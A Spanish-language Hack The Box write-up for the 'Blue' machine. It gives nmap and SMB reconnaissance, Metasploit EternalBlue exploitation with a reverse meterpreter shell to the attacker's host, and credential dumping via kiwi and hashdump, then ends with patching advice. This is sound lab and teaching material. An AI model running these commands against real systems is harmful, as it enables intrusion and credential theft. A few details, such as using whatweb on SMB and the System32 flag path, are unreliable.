---
title: "hackthebox-blue"
description: "Writeup paso a paso de la máquina Blue de Hack The Box: reconocimiento SMB y explotación MS17-010 (EternalBlue) hasta obtener acceso administrador."
date: "2026-01-12"
published: true
tags: ["hackthebox", "writeup", "windows", "smb", "ms17-010"]
readTime: "10 min"
---

# ✅ Hack The Box — Blue (Paso a Paso)

Máquina clásica de Windows vulnerable a **MS17-010 (EternalBlue)**. Veremos reconocimiento de servicios SMB y explotación con Metasploit, cerrando con recomendaciones defensivas.

---

## 1) Preparación del entorno
- IP objetivo (HTB): `10.10.10.X`
- IP atacante: `10.10.14.Y`
- Herramientas: `nmap`, `smbclient`, `msfconsole`, `python`, `whoami`, `hashdump`

---

## 2) Reconocimiento de puertos y servicios

```bash
nmap -sC -sV -Pn -oN nmap_initial 10.10.10.X
```

Resultados esperados:
- 135/tcp RPC
- 139/tcp NetBIOS-SSN
- 445/tcp Microsoft-DS (SMB)

Exploración completa:

```bash
nmap -p- --min-rate 5000 -Pn -oN nmap_all 10.10.10.X
nmap -sC -sV -p 139,445 -Pn -oN nmap_detail 10.10.10.X
```

---

## 3) Enumeración SMB

```bash
whatweb smb://10.10.10.X
smbclient -L 10.10.10.X -N
```

Si el listado requiere credenciales, continuamos directamente a la detección de vulnerabilidad.

---

## 4) Detección de MS17-010 (EternalBlue)

```bash
nmap --script smb-vuln-ms17-010 -p 445 -Pn 10.10.10.X -oN nmap_ms17-010
```

Si el script confirma la vulnerabilidad, podemos proceder a explotación.

---

## 5) Explotación con Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X
set LHOST 10.10.14.Y
set Payload windows/x64/meterpreter/reverse_tcp
run
```

Una vez cargado `meterpreter`:

```bash
sysinfo
getuid
shell
```

Si obtienes una shell del sistema, estás en camino a `SYSTEM`/Administrador.

---

## 6) Post-explotación y evidencias

Obtener información del sistema y usuarios:

```bash
whoami
hostname
net user
```

Volcar hashes (si es posible):

```bash
load kiwi
creds_all
hashdump
```

Buscar flags:

```bash
dir C:\\Users
type C:\\Users\\<usuario>\\Desktop\\user.txt
type C:\\Windows\\System32\\config\\root.txt
```

En algunas máquinas, la `root.txt` está en `C:\\Users\\Administrator\\Desktop\\root.txt`.

---

## 7) Limpieza
- Cierra sesiones `meterpreter` y elimina artefactos temporales si los has subido.
- Registra las evidencias (hashes/flags) y los pasos realizados.

---

## 8) Conclusión

La explotación de **MS17-010 (EternalBlue)** demuestra el impacto crítico de no aplicar parches en servicios expuestos, especialmente **SMB**. Para mitigar:
- Mantén los sistemas actualizados con parches acumulativos de seguridad.
- Deshabilita **SMBv1** y reduce servicios innecesarios.
- Segmenta la red y aplica listas de control de acceso para limitar el alcance lateral.
- Supervisa logs de **SMB** y alertas de escaneos de puerto 445.

Este ejercicio resalta que una sola vulnerabilidad remota con privilegios elevados puede comprometer por completo un host Windows si no existe una política de actualización y segmentación estricta.

---

## Comandos clave usados

```bash
nmap -sC -sV -Pn 10.10.10.X
nmap --script smb-vuln-ms17-010 -p 445 -Pn 10.10.10.X
msfconsole; use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X; set LHOST 10.10.14.Y; run
whoami; net user; hashdump
type C:\\Users\\<usuario>\\Desktop\\user.txt
type C:\\Users\\Administrator\\Desktop\\root.txt
```

